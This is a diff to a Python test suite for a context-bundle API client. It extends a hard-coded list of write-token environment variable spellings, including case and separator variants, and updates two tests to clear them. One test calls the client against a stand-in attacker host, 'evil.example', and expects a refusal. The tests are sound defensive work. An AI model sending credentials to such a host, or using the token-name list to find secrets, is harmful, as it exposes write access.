@@ -87,9 +87,12 @@ def _finding_identities(doc):
                   for f in doc.findings)
 
 
-# Both spellings of the one write credential, written out rather than read from the module so a
-# mutation that drops one from `dc._WRITE_TOKEN_NAMES` cannot shrink the tests along with it.
-_WRITE_TOKEN_SPELLINGS = ("CONTEXT_MEMORY_WRITE_TOKEN", "ApiAccess__WriteToken")
+# Every spelling of the one write credential, written out rather than read from a module so a mutation
+# that narrows the guard cannot shrink the tests along with it. Consumer review 5440964552 #1: the third
+# spelling and the case/separator variants the sibling read client refuses were ambient past this guard.
+_WRITE_TOKEN_SPELLINGS = ("CONTEXT_MEMORY_WRITE_TOKEN", "ApiAccess__WriteToken",
+                          "Parameters__api-write-token", "apiaccess:writetoken",
+                          "PARAMETERS__API-WRITE-TOKEN")
 
 
 class _CleanCredentialEnv:
@@ -1058,7 +1061,7 @@ class CredentialTransportTests(_CleanCredentialEnv, unittest.TestCase):
         with mock.patch.dict(os.environ, env), \
                 mock.patch.object(urllib.request, "build_opener",
                                   side_effect=lambda *h: _RecordingOpener()) as build:
-            for name in dc._WRITE_TOKEN_NAMES:
+            for name in _WRITE_TOKEN_SPELLINGS:
                 os.environ.pop(name, None)
             with self.assertRaises(ValueError) as caught:
                 dc.fetch_bundle_from_api("http://evil.example:5141", {"anchor": {}})
@@ -1844,7 +1847,7 @@ class PreviewRequestTests(_CleanCredentialEnv, unittest.TestCase):
         with mock.patch.dict(os.environ, env), \
                 mock.patch.object(urllib.request, "build_opener", side_effect=lambda *h: _FakeOpener()), \
                 contextlib.redirect_stdout(stdout):
-            for name in dc._WRITE_TOKEN_NAMES:
+            for name in _WRITE_TOKEN_SPELLINGS:
                 os.environ.pop(name, None)
             rc = dc.main(["preview", "--repo", "owner/repo", "--ticket", "github:160",
                           "--widen-depth", "2", "--heimdallr", "false"])
